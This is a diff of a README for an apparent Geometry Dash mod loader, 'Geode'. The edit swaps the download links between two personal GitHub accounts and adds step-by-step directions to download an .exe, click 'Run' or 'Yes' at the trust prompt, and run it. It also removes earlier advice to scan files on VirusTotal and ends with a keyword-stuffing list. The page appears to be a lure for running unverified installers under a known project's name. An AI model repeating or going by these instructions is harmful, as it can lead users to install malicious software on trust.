@@ -1,79 +1,79 @@
-# Geode Geometry Dash — Mod Loader & Manager for GD
+# 🎮 Geode-Geometry-Dash - Manage your favorite game mods easily
 
-**Geode Geometry Dash** is a comprehensive mod collection and loader setup for Geometry Dash that enhances the game with new features, custom levels, gameplay tweaks, and quality-of-life improvements through the Geode mod loader framework.
+[![Download Geode](https://img.shields.io/badge/Download-Geode-blue.svg)](https://github.com/IMadeThisAccForBlockyGames/Geode-Geometry-Dash/releases)
 
-Geode is the standard modding platform for Geometry Dash, providing a stable loader, a mod manager, and a rich API for mod developers. This repository packages the Geode installer along with a curated collection of popular GD mods, custom level tools, and gameplay modifications. Compare Geode with Amethyst and Minecraft mod loaders for cross-platform modding approaches.
+## 📦 What is Geode?
 
-<img width="124" height="124" alt="d2cbd2cc-ad2c-495b-b516-16fbc4035f0e" src="https://github.com/user-attachments/assets/7d42c9c6-b7d0-4d01-bbcb-5c51bab9e90c" />
+Geode is a tool for Geometry Dash. It lets you add new features, change game settings, and install mods. You can find mods for new levels, custom graphics, and different gameplay styles. Geode acts as a central hub. It keeps your mods organized and makes sure they work with your game version. You do not need technical skills to use this tool. It handles the difficult setup tasks for you.
 
-## Install
-[Download `Geodes-Setup-v5.8.3.zip`](https://github.com/geodgd/Geode-Geometry-Dash/releases/download/v5.8.3/Geode-Setup-v5.8.3.zip)
----
+## 🛠️ System Requirements
 
-<img width="738" height="416" alt="dad0cea9-ed4a-414b-9cb3-fad506182137" src="https://github.com/user-attachments/assets/5250a416-d7ba-4731-8684-3f08fbf72541" />
-<img width="192" height="207" alt="d29abc66-be95-4032-bd57-c78f7416ef48" src="https://github.com/user-attachments/assets/ff5aaab9-429d-4e75-84f3-3e0017be9be2" />
+Before you install Geode, check that your computer meets these needs:
 
----
-## Key Features
-- **Easy Geode loader installation** — one-click setup with automatic path detection
-- **Support for a wide range of Geometry Dash mods** — gameplay, visual, utility, and custom level mods
-- **Custom levels and gameplay modifications** — new level packs, difficulty editors, and practice tools
-- **Quality-of-life improvements** — FPS bypass, show hitboxes, level downloader, and more
-- **Regular updates** for new Geode mods and Geometry Dash version compatibility
-- **Mod manager** — enable, disable, configure, and update installed mods from a single interface
-- **Developer API** — rich C++ API for creating custom mods with geometry dash hooks and patches
+*   Operating System: Windows 10 or Windows 11.
+*   Game Version: Geometry Dash version 2.2 or newer.
+*   Disk Space: At least 200 megabytes of free space.
+*   Internet Connection: Required for downloading mods.
 
-<img width="1920" height="1080" alt="5f7255ec-0d61-4efd-a12f-26c6bc8a7c78" src="https://github.com/user-attachments/assets/b8503a7b-6539-42ed-9654-dc98cbd9f5d0" />
-<img width="709" height="608" alt="682ef132-9ded-45d2-8785-a5f503b867a3" src="https://github.com/user-attachments/assets/fdd8666d-2b4b-4215-a7b9-cc1bb7b0a567" />
+If your computer uses an older version of Windows, the application might not run as expected. Ensure your graphics card drivers have the latest updates to prevent game crashes during mod loading.
 
-## Getting Started
-1. **Download** the latest version using the button above.
-2. **Extract** the archive to a folder on your computer.
-3. **Run the installer** and follow the on-screen instructions.
-4. **Install Geode** if not already installed on your Geometry Dash copy.
-5. **Browse mods** — select from the curated collection or install custom mods.
-6. **Launch Geometry Dash** and enjoy your modded experience.
+## 📥 How to Install Geode
 
-**Note:** Make sure you have a legitimate copy of Geometry Dash installed (Steam or standalone) before installing Geode mods.
+Follow these steps to get Geode on your Windows computer.
 
+1.  Visit the official release page here: [https://github.com/IMadeThisAccForBlockyGames/Geode-Geometry-Dash/releases](https://github.com/IMadeThisAccForBlockyGames/Geode-Geometry-Dash/releases)
+2.  Look for the file that ends in `.exe`. This is the installer.
+3.  Click the file name to start the download. Save the file to your Downloads folder.
+4.  Open your Downloads folder and double-click the file you just downloaded.
+5.  A window might appear that asks if you trust the app. Click "Run" or "Yes" to start the installer.
+6.  Follow the instructions on the screen. The installer will locate your Geometry Dash folder automatically.
+7.  Click "Finish" once the installation completes.
 
----
-## System Requirements
-- **Windows 10 / 11**
-- Geometry Dash installed (Steam or standalone version)
-- Administrator privileges recommended for installation
+## 🕹️ Using the Mod Loader
 
----
-## Security & Legal
-**Important Notice:**
-Using mods in Geometry Dash may affect online features, leaderboards, or lead to account issues. Use at your own risk and disable mods before attempting online activities.
+Once you install Geode, open Geometry Dash as you normally do. You will notice a new menu button on the main screen. Click this button to open the Geode overlay.
 
-<img width="900" height="179" alt="39c281af-d732-4d07-9470-e049a1cbf9cd" src="https://github.com/user-attachments/assets/ffcf0a5a-0b8e-4365-bd7d-0f18ec701d41" />
+The overlay shows a list of available mods. You can browse them by category or search by name. To install a mod, click the "Install" button next to it. Geode takes care of the rest. You do not need to move files or restart your computer. Most mods apply changes immediately.
 
-**Recommendations:**
-- Download **only** from this official GitHub repository.
-- Scan files on [VirusTotal](https://www.virustotal.com) before running.
-- Back up your game files and save data before installing mods.
-- Disable mods before playing online or submitting level scores.
+## ⚙️ Managing Your Mods
 
----
-## Contributing
-Contributions are welcome! Help add new mods, fix compatibility with new Geometry Dash versions, improve the installer, or enhance the mod manager interface. Fork the repository and submit a pull request.
+You can turn mods on or off at any time. Open the Geode overlay and go to the "Installed" tab. Each mod has a toggle switch. Slide the switch to disable a mod if you want to play the game without it. 
 
----
-## License & Acknowledgments
-### License
-**Geode Geometry Dash** is shared under the **MIT License**.
-See [LICENSE](LICENSE) for details.
+If a mod causes issues, you can remove it by clicking the trash icon. Geode keeps your game files safe. It creates backups of your game data before it makes changes. If a mod stops your game from starting, Geode enters a "Safe Mode" to help you remove the problematic file.
 
-**Copyright © 2026 marinhoxzz-legitzs**
+## 🌐 Community and Troubleshooting
 
-### Acknowledgments
-- Thanks to the Geode team and the Geometry Dash modding community.
-- Inspired by Amethyst, Minecraft mod loaders, and other game modding frameworks.
+Many users share their favorite mod setups online. You can find collections of mods tailored for specific gameplay styles, such as training for difficult levels or adding custom sound packs. 
 
-<p align="center">
-  Developed with ❤️ for the Geometry Dash community
-</p>
+If you encounter a problem, check these standard fixes first:
 
-<img width="596" height="335" alt="0a6ea182-b9a4-441a-8519-24106aba3959" src="https://github.com/user-attachments/assets/224c7009-3425-4fb9-a687-717110b3cfd2" />
+*   Restart the game: Closing and reopening Geometry Dash often fixes minor glitches.
+*   Check for updates: Open the Geode menu and click "Check for Updates" to ensure you use the latest version of the loader.
+*   Disable conflicting mods: If the game crashes, try disabling your most recently installed mods one by one.
+*   Verify game files: Use the Steam application to verify your Geometry Dash files if the base game refuses to launch.
+
+## 📋 Features Overview
+
+*   One-click installation for hundreds of mods.
+*   Compatibility checks to prevent outdated mod crashes.
+*   Built-in search to find mod creators and recent uploads.
+*   Automatic background updates for the loader.
+*   Simple interface that matches the game design.
+*   Support for custom private server integrations.
+*   Extensive mod library for level design and high-score tracking.
+
+## 📝 Frequently Asked Questions
+
+**Does Geode change my game data permanently?**
+No. Geode loads mods into the game memory while playing. Your original game files remain unchanged. You can uninstall Geode at any time to return your game to its original state.
+
+**Is it safe to use mods in Geometry Dash?**
+Yes. Geode focuses on safe and stable hooks. However, you should only download mods from trusted sources within the Geode internal browser to avoid malicious content.
+
+**Can I use mods while playing online levels?**
+Some mods might alter gameplay in ways that make levels easier or harder. Be careful when using these, as certain modifications might conflict with game rules. Most cosmetic mods work fine in all game modes.
+
+**How do I clear the mod cache?**
+If you experience strange behavior, navigate to the Geode settings menu in the game and select "Clear Cache." This removes temporary files and allows the loader to fetch fresh data from the server.
+
+Keywords: gd, gd-hack, gd-library, gd2-library, gdnews, gdps, geode, geode-mod, geode-sdk, geometry-dash, geometry-dash-bot, geometry-dash-browser-game, geometry-dash-clone, geometry-dash-download, geometry-dash-levels, geometry-dash-mod, geometry-dash-private-server, geometrydash, gmd, robtop
